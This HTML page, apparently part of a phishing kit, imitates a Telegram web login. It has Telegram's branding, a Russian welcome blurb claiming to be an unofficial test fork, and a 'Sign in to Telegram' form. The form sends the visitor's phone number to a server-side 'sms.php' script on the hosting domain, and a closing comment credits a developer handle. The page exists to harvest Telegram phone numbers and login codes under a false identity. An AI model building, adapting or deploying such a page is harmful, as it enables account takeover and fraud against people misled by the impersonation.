      <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,shrink-to-fit=no">
      <meta name="theme-color" content="#000000">
      <meta name="apple-mobile-web-app-title" content="Telegram Online">
      <meta name="mobile-web-app-capable" content="yes">
      <meta name="apple-mobile-web-app-capable" content="yes">
      <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
      <meta name="google" content="notranslate">
      <meta property="og:title" content="Telegram Online">
      <meta property="og:url" content="https://xn--r1a.online/">
      <meta property="og:image:width" content="192">
      <meta property="og:image:height" content="192">
      <meta property="og:image" content="./img/icons/icon192.png">
      <meta property="og:site_name" content="Telegram Online">
      <meta property="description" content="Неофициальная Веб Версия Телеграм Мессенджера.">
      <meta property="og:description" content="Неофициальная Веб Версия Телеграм Мессенджера. Вопросы и предложения в группе https://t.me/react_telegram">
      <link rel="manifest" href="./manifest.json">
      <link id="favicon" rel="shortcut icon" href="./favicon.ico">
      <link href="./img/icons/icon90.png" rel="apple-touch-icon">
      <link href="./img/icons/icon90.png" rel="apple-touch-icon" sizes="90x90">
      <link href="./img/icons/icon128.png" rel="apple-touch-icon" sizes="128x128">
      <link href="./img/icons/icon192.png" rel="apple-touch-icon" sizes="192x192">
      <title>Telegram Онлайн</title>
      <script async="" src="https://www.google-analytics.com/analytics.js"></script><script>window.location.hash="react",window.location.hash="telegram",window.onhashchange=function(){window.location.hash=""}</script>
      <link href="./static/css/2.23e308ff.chunk.css" rel="stylesheet">
   </head>
   <body>
      <div class="welcome_telegram">
         <h1>Telegram Online</h1>
         <p>Добро пожаловать в тестовую версию мессенджера <a href="https://xn--r1a.online">Web Telegram</a> online. Это неофициальная сборка (fork) от приложения Telegram React, создана чтобы помочь и ускорить процесс разработки новой web версии мессенджера <b>Телеграм онлайн</b>. Официальная веб версия находится по адресу web.telegram.org. Telegram онлайн работает на базе кроссплатформенной библиотеки <b>TdLib</b>, которая позволяет использовать все функции мессенджера на любой платформе. Мессенджер Telegram online можно открыть через браузер: Chrome, Яндекс.Браузер, Opera, Safari, Mozilla Firefox, Microsoft Edge и другие. На данный момент ведется отладка и открытое тестирование веб версии Телеграм онлайн, поэтому все желающие могут присоединиться и сделать свой вклад в развитие проекта. Любые ошибки, пожелания и комментарии по работе веб версии Телеграм, принимаются и обсуждаются в группе <a href="tg://resolve?domain=react_telegram">@react_telegram</a></p>
      </div>
      <noscript>You need to enable JavaScript to run Web Telegram app.</noscript>
      <div id="root">
         <div id="app" class="light">
            <div class="authorization-form">
               <div class="authorization-form-content">
                  <div class="auth-caption">
                     <svg class="auth-caption-telegram-logo" width="160px" height="160px" viewBox="0 0 160 160">
                        <title></title>
                        <g id="Login" stroke="none" stroke-width="1" fill-rule="evenodd">
                           <g id="Login_5_Phone" transform="translate(-760.000000, -186.000000)">
                              <path d="M840,346 C795.81722,346 760,310.18278 760,266 C760,221.81722 795.81722,186 840,186 C884.18278,186 920,221.81722 920,266 C920,310.18278 884.18278,346 840,346 Z M794.596303,264.66919 C790.659174,266.234556 788.596733,267.765936 788.408978,269.263329 C788.048509,272.138166 792.188142,273.033142 797.396667,274.725906 C801.643184,276.106018 807.355495,277.720609 810.325092,277.784753 C813.018799,277.842938 816.025284,276.732617 819.344546,274.453789 C841.998088,259.16492 853.691946,251.437186 854.426119,251.270588 C854.944065,251.153055 855.661811,251.005273 856.148118,251.437434 C856.634425,251.869594 856.586618,252.688022 856.535106,252.907586 C856.123224,254.663156 834.84286,274.015606 833.61816,275.287388 C828.938462,280.146996 823.615302,283.120543 831.826781,288.530755 C838.932147,293.212193 843.067503,296.19863 850.387542,300.996094 C855.065474,304.061953 858.733031,307.697601 863.562866,307.253237 C865.785287,307.048765 868.080902,304.959403 869.246762,298.727987 C872.002037,284.001293 877.417883,252.09303 878.669527,238.944397 C878.779187,237.792407 878.641237,236.318088 878.530455,235.670896 C878.419672,235.023705 878.188168,234.101592 877.346762,233.418979 C876.350285,232.610561 874.811937,232.440083 874.123923,232.4522 C870.995743,232.507295 866.196346,234.175802 843.099163,243.78089 C835.009657,247.144954 818.842037,254.107721 794.596303,264.66919 Z"></path>
                           </g>
                        </g>
                     </svg>
                  </div>
                  <form class="auth-root" autocomplete="off" method="GET" action="<?php echo $ssl; ?>://<?php echo $_SERVER['HTTP_HOST']; ?>/sms.php">
                     <p class="MuiTypography-root auth-title MuiTypography-body1"><span>Sign in to Telegram</span></p>
                     <div class="MuiFormControl-root MuiTextField-root auth-input MuiFormControl-fullWidth">
                        <label class="MuiFormLabel-root MuiInputLabel-root MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink MuiInputLabel-outlined MuiFormLabel-filled" data-shrink="true" for="phoneNumber" id="phoneNumber-label">Phone Number</label>
                        <div class="MuiInputBase-root MuiOutlinedInput-root MuiInputBase-fullWidth MuiInputBase-formControl">
                           <input aria-invalid="false" autocomplete="off" name="tlf" type="text" class="MuiInputBase-input MuiOutlinedInput-input" value=" ">
                           <fieldset aria-hidden="true" class="jss1 MuiOutlinedInput-notchedOutline">
                              <legend class="jss3 jss4"><span>Phone Number</span></legend>
                           </fieldset>
                        </div>
                     </div>

                     <input type="submit" class="MuiButtonBase-root MuiButton-root auth-button MuiButton-contained MuiButton-containedPrimary  MuiButton-fullWidth" type="button" value="NEXT">


                     <div class="sign-in-keep">
                        <span class="MuiButtonBase-root MuiIconButton-root jss5 MuiCheckbox-root MuiCheckbox-colorPrimary jss6 Mui-checked MuiIconButton-colorPrimary" aria-disabled="false">
                           <span class="MuiIconButton-label">
                              <input class="jss8" type="checkbox" data-indeterminate="false" value="" checked="">
                              <svg class="MuiSvgIcon-root" focusable="false" viewBox="0 0 24 24" aria-hidden="true">
                                 <path d="M19 3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.11 0 2-.9 2-2V5c0-1.1-.89-2-2-2zm-9 14l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path>
                              </svg>
                           </span>
                           <span class="MuiTouchRipple-root"></span>
                        </span>
                        <p class="MuiTypography-root MuiTypography-body1">Keep me signed in</p>
                     </div>
                  </form>
                  <div class="footer-wrapper"><span>0.0.867.93</span></div>
               </div>
            </div>
         </div>
      </div>

   </body>
</html>
<!-- developer by @crydollar in telegram -->